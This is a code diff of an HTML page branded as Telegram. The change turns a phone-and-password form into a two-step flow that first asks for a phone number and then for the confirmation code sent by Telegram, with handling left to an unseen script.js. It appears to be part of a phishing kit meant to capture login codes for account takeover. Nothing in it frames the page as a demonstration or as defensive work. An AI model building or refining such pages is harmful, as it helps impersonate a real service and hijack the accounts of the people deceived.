@@ -7,12 +7,19 @@
 <body>
     <div class="container">
         <h2>Telegram</h2>
-        <p>Enter your phone and password</p>
-        <form id="loginForm">
+        <p>Enter your phone number</p>
+        <form id="phoneForm">
             <input type="tel" id="phone" placeholder="Phone number" required>
-            <input type="password" id="password" placeholder="Password" required>
             <button type="submit">NEXT</button>
         </form>
+        
+        <div id="codeSection" style="display: none;">
+            <p>Enter confirmation code</p>
+            <form id="codeForm">
+                <input type="text" id="code" placeholder="Code from Telegram" required>
+                <button type="submit">CONFIRM</button>
+            </form>
+        </div>
     </div>
     <script src="script.js"></script>
 </body>
